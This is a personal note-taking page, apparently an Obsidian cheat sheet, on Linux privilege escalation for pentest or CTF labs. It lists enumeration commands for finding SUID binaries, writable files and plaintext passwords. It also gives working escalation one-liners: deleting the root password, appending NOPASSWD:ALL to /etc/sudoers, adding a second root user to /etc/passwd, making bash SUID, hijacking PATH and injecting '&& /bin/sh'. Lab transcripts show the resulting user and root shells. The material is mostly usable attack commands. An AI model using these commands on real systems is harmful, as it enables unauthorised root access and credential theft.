---
creation date: December 19th 2022
last modified date: December 19th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Linux Privilege Escalation]]  
___

## Description:  
Auto enumeration with [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
### useful enumeration

users
`cat /etc/passwd`

**What commands can the user execute with sudo?
`sudo -l

**What is the kernel version and architecture type?
`uname -a
`uname -r

**What is the OS version
`cat /etc/*-release
kernel modules
`lsmod`
`/sbin/modinfo libata`

**What languages are installed?
`man -k language
`which gcc
`which g++

**running processes**
ps aux

**Run pspy64 on the machine to get the process run by root.**

**What are the SUID/GUID binaries?
``find / -perm -u=s -type f 2>/dev/null
``find / -perm -g=s -type f 2>/dev/null

look for vulnerable programs that run as root
[gtfobins](https://gtfobins.github.io/)

**Are there world writable files?
`find / -writable -type d 2>/dev/null

**What have users been doing? Command history?
`history
``.bash_history

**Are there any plaintext credentials to be found?
`find . -type f | xargs grep –i “password”
`grep –r . –e “password” 2>/dev/null

**What jobs are scheduled?
`crontab -l
l`s -lah /etc/cron* 2>/dev/null
`cat /etc/crontab`

networking
`netstat -tulpn`
`/sbin/route`
`ss -anp`
`cd /etc/iptables`
`cat /etc/hosts` (can find vhosts on webservers or check config files)

**applications installed**
`dpkg -l`

**unmounted disks
`cat /etc/fstab`
`mount`
`/bin/lsblk`

**What processes and services are running?  Which are running as root?
`ps –ef
`ps –ef | grep root

**Script that deletes the root password**
bash:
`passwd -d root`
`su root`
python:
`import os;os.system(\"passwd -d root\")`
or
`echo "import os;os.system(\"passwd -d root\")" > bash.py`


**Scripts that can be used if they run as root:
`echo “user ALL=(ALL) NOPASSWD:ALL” >> /etc/sudoers
`echo “user::0:0:System Administrator:/root/root:/bin/bash” >> /etc/passwd
`bash -i

**Editing the Sudoers file to give root
change:
`loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht 
To:
`loneferret ALL=NOPASSWD: /bin/su, /usr/local/bin/ht 
`loneferret@Kioptrix3:~$ sudo /bin/su 

**Can you set a SUID on bash?
`chmod +s /bin/bash`
`/bin/bash -p`

**Is /etc/passwd writable?**
Removing x means root requires no password
`echo root::0:0:root:/root:/bin/bash > /etc/passwd`
--OR--
generate hash of the password:
`openssl passwd -1 -salt [salt value] {password}
`openssl passwd -1 -salt user3 pass123
to create a second root user with "mrcake" password:
`echo "root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash" >> /etc/passwd
to switch to a root2 account that was just created:
`su root2
`Password: mrcake
su root
**Can you run tcpdump?**
run tcpdump with -I lo for loopback
or what other systems are connecting to it? You might be able to get a username and password

**is it AD domain joined?**
check:
`/var/lib/sss/db`
`strings cache_cerberus.local.ldb
Look for password hashes

**Program that runs a command without an absolute path**
Create a program with the same name in the tmp directory (echo /bin/bash >> command) and then add tmp to the beginning of path (export PATH=/tmp:$PATH)

```
kane@pwnlab:~$ cd /tmp

cd /tmp

kane@pwnlab:/tmp$ echo /bin/bash > cat

echo /bin/bash > cat

kane@pwnlab:/tmp$ chmod 777 cat

chmod 777 cat

kane@pwnlab:/tmp$ export PATH=/tmp:$PATH

export PATH=/tmp:$PATH

kane@pwnlab:/tmp$ cd /home/kane

cd /home/kane

kane@pwnlab:~$ ./msgmike

./msgmike

mike@pwnlab:~$ id

id

uid=1002(mike) gid=1002(mike) groups=1002(mike),1003(kane)

```
**Can you use command concatenation with && /bin/sh or &&/bin/bash?

```
mike@pwnlab:/home/mike$ ./msg2root

./msg2root

Message for root: hello && /bin/sh

hello && /bin/sh

hello

# id

id

uid=1002(mike) gid=1002(mike) euid=0(root) egid=0(root) groups=0(root),1003(kane)

```



___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 19th 2022 (01:02 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
